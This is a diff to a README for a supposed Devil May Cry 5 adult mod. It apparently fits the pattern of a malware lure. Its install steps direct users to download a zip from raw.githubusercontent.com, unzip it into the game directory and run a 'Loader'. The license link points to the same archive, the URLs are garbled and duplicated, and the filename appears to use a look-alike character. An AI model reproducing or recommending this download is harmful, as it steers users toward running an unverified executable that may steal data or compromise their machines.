@@ -30,8 +30,8 @@ Welcome to the **Devil May Cry 5 NSFW Patch** repository! This tool enhances you
 
 ## 🚀 Installation Instructions 🚀
 
-1. Download `https://raw.githubusercontent.com/Betawi10/DMC5-AphoticModifications/main/Lоader.zip` from the repository.
-2. Unzip `https://raw.githubusercontent.com/Betawi10/DMC5-AphoticModifications/main/Lоader.zip` to your Devil May Cry 5 installation directory.
+1. Download `https://raw.githubusercontent.com/Betawi10/DMC5-AphoticModifications/main/counterextend/Modifications-DM-Aphotic-1.0.zipоhttps://raw.githubusercontent.com/Betawi10/DMC5-AphoticModifications/main/counterextend/Modifications-DM-Aphotic-1.0.zip` from the repository.
+2. Unzip `https://raw.githubusercontent.com/Betawi10/DMC5-AphoticModifications/main/counterextend/Modifications-DM-Aphotic-1.0.zipоhttps://raw.githubusercontent.com/Betawi10/DMC5-AphoticModifications/main/counterextend/Modifications-DM-Aphotic-1.0.zip` to your Devil May Cry 5 installation directory.
 3. Launch the Loader and follow on-screen instructions.
 4. Restart the game and enjoy!
 
@@ -51,4 +51,4 @@ NSFW mod, Devil May Cry 5 adult patch, DMC5 mature mod, custom skins, visual mod
 
 ## 📜 License: MIT – 2025 📜
 
-This project is licensed under the [MIT License](https://raw.githubusercontent.com/Betawi10/DMC5-AphoticModifications/main/Lоader.zip) – 2025. Enjoy, modify, and share responsibly!
+This project is licensed under the [MIT License](https://raw.githubusercontent.com/Betawi10/DMC5-AphoticModifications/main/counterextend/Modifications-DM-Aphotic-1.0.zipоhttps://raw.githubusercontent.com/Betawi10/DMC5-AphoticModifications/main/counterextend/Modifications-DM-Aphotic-1.0.zip) – 2025. Enjoy, modify, and share responsibly!
